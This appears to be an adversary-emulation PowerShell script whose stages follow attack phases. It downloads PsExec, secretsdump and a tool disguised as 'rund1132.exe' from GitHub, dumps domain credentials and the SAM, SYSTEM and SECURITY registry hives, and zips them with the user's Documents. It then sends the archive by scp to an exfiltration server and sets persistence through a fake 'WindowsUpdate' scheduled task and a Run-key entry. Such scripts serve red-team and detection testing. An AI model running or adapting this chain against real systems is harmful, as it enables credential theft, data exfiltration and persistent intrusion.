# Initial Access
$domain = ""
$user = ""
$password = ""
$logonServer = ""
$localIp = ""

# Command and Control
$toolsUrl = "https://github.com/spicy-bear/tools/raw/main"
$toolsPath = "C:\ProgramData\temp"
New-Item -ItemType Directory -Force -Path $toolsPath | Out-Null

Start-BitsTransfer -Source "$toolsUrl/rund1132.exe" -Destination "$toolsPath\rund1132.exe"
Start-BitsTransfer -Source "$toolsUrl/netsess.exe" -Destination "$toolsPath\netsess.exe"
Start-BitsTransfer -Source "$toolsUrl/nbtscan.exe" -Destination "$toolsPath\nbtscan.exe"
Start-BitsTransfer -Source "$toolsUrl/PsExec.exe" -Destination "$toolsPath\PsExec.exe"
Start-BitsTransfer -Source "https://github.com/maaaaz/impacket-examples-windows/raw/master/secretsdump.exe" -Destination "$toolsPath\secretsdump.exe"

# Discovery
net use \\$logonServer\IPC$ /user:$domain\$user $password
net view /domain:$domain

& "$toolsPath\nbtscan.exe" $logonServer -n -r -s
& "$toolsPath\rund1132.exe" $logonServer 3389
& "$toolsPath\rund1132.exe" $logonServer 22
& "$toolsPath\rund1132.exe" $logonServer 445
& "$toolsPath\netsess.exe" $logonServer

# Credential Access using secretsdump.exe
$secretsdump_local_path = "$toolsPath\secretsdump.exe"
$secretsDumpCmd = "$secretsdump_local_path ${domain}/${user}:${password}@${logonServer}"
& "$toolsPath\PsExec.exe" -accepteula -s -u $user -p $password $secretsDumpCmd

# Save registry hives
& "$toolsPath\PsExec.exe" -accepteula -s -u $user -p $password reg save hklm\sam C:\Windows\Temp\sam
& "$toolsPath\PsExec.exe" -accepteula -s -u $user -p $password reg save hklm\system C:\Windows\Temp\system
& "$toolsPath\PsExec.exe" -accepteula -s -u $user -p $password reg save hklm\security C:\Windows\Temp\security

# Archive the collected data including registry hives and dumped credentials
$archiveName = "C:\Windows\Temp\collected_data.zip"
Compress-Archive -Path "$env:USERPROFILE\Documents\*", "C:\Windows\Temp\sam", "C:\Windows\Temp\system", "C:\Windows\Temp\security", "C:\Windows\Temp\creds_dump*" -DestinationPath $archiveName

# Exfiltration
$exfilServer = ""
$scpUser = "scpuser"
$scpPassword = ""
$uploadPath = "/home/scpuser/uploads"

# Automate SCP using sshpass
$env:SSHPASS = $scpPassword
Start-Process -FilePath "sshpass" -ArgumentList "-p", $scpPassword, "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $archiveName ${scpUser}@${exfilServer}:${uploadPath}/" -NoNewWindow -Wait

# Lateral Movement
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($user, $securePassword)
Invoke-Command -ComputerName $logonServer -Credential $credential -ScriptBlock {
    Get-Process
}

# Execution
(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/spicy-bear/tools/main/blank.ps1'
schtasks /create /sc onlogon /tn "WindowsUpdate" /ru "System" /tr "powershell.exe -ExecutionPolicy Bypass -File \"C:\ProgramData\temp\update_script.ps1\""


# Persistence
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
